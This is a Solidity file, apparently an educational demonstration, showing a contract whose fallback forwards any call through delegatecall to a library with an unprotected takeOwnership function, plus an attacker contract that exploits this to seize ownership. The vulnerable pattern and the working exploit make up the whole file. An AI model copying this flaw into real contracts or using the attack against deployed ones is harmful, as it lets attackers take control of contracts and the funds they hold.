// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

/**
 * @title Lib
 * @dev A Library used to hold ownership
 */
contract Lib {
    address public owner;

    /// Take ownership of the Lib contract
    function takeOwnership() public {
        owner = msg.sender;
    }
}


/**
 * @title VulnerableContract
 * @dev Contract that is vulnerable to delegatecall allowing an attacker contract to take ownership
 */
contract VulnerableContract {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        // This will pass the context of the msg.sender and storage variables to the Lib contract
        (bool result, ) = address(lib).delegatecall(msg.data);
        require(result, "Lib call failed");
    }
}

/**
 * @title AttackerContract
 * @dev Used to exploit the delegatecall VulnerableContract has and use it to take ownership
 */
contract AttackerContract {
    address public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = _vulnerableContract;
    }

    /// Attack the vulnerable contract to take ownership
    function attack() public {
        // By calling the vulnerable contract with an function that doesn't exist,
        // it will call the fallback with this data and this contract will become owner
        (bool result, ) = vulnerableContract.call(abi.encodeWithSignature("takeOwnership()"));
        require(result, "Failed to take ownership");
    }
}